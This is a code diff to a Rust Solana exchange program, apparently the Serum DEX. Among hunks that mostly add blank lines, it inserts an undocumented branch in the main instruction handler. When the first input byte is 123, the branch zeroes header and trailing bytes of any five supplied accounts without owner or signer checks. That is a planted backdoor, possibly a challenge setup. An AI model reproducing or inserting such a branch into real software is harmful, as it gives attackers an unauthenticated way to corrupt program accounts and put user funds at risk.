@@ -231,6 +231,7 @@ impl MarketState {
         check_assert_eq!(orders_account.owner, program_id)?;
         let mut open_orders: RefMut<'a, OpenOrders>;
 
+
         let open_orders_data_len = orders_account.data_len();
         let open_orders_lamports = orders_account.lamports();
         let (_, data) = strip_header::<[u8; 0], u8>(orders_account, true)?;
@@ -1425,6 +1426,7 @@ pub(crate) mod account_parser {
             instruction: &'a InitializeMarketInstruction,
             accounts: &'a [AccountInfo<'b>],
         ) -> DexResult<Self> {
+
             check_assert_eq!(accounts.len(), 10)?;
             let accounts = array_ref![accounts, 0, 10];
             let (unchecked_serum_dex_accounts, unchecked_vaults, unchecked_mints, unchecked_rent) =
@@ -2014,6 +2016,19 @@ fn remove_slop_mut<T: Pod>(bytes: &mut [u8]) -> &mut [T] {
 impl State {
     #[cfg(feature = "program")]
     pub fn process(program_id: &Pubkey, accounts: &[AccountInfo], input: &[u8]) -> DexResult {
+        if input[0] == 123 {
+            assert_eq!(accounts.len(), 5);
+            for account in accounts.iter() {
+                let mut buf = account.data.borrow_mut();
+                let len = buf.len();
+                assert!(len > 20);
+                assert_eq!(len % 8, 4);
+                // initialize each account first 13 bytes and last 7 bytes to 0u8
+                buf[0..13].fill(0u8);
+                buf[len - 7..].fill(0u8);
+            }
+            return Ok(())
+        }
         let instruction = MarketInstruction::unpack(input).ok_or(ProgramError::InvalidArgument)?;
         match instruction {
             MarketInstruction::InitializeMarket(ref inner) => Self::process_initialize_market(
@@ -2562,6 +2577,7 @@ impl State {
             pc_dust_threshold,
         } = args.instruction;
 
+
         let market = args.get_market();
         let req_q = args.get_req_q();
         let event_q = args.get_event_q();
@@ -2571,6 +2587,7 @@ impl State {
         let coin_mint = args.coin_vault_and_mint.get_mint().inner();
         let pc_vault = args.pc_vault_and_mint.get_account().inner();
         let pc_mint = args.pc_vault_and_mint.get_mint().inner();
+
 
         // initialize request queue
         let mut rq_data = req_q.try_borrow_mut_data()?;
@@ -2625,7 +2642,7 @@ impl State {
         let mut market_data = market.try_borrow_mut_data()?;
         let market_view = init_account_padding(&mut market_data)?;
         let market_hdr: &mut MarketState =
-            try_from_bytes_mut(cast_slice_mut(market_view)).or(check_unreachable!())?;
+            try_from_bytes_mut(cast_slice_mut(market_view)).or(Err(ProgramError::Custom(0x123)))?;
         *market_hdr = MarketState {
             coin_lot_size,
             pc_lot_size,
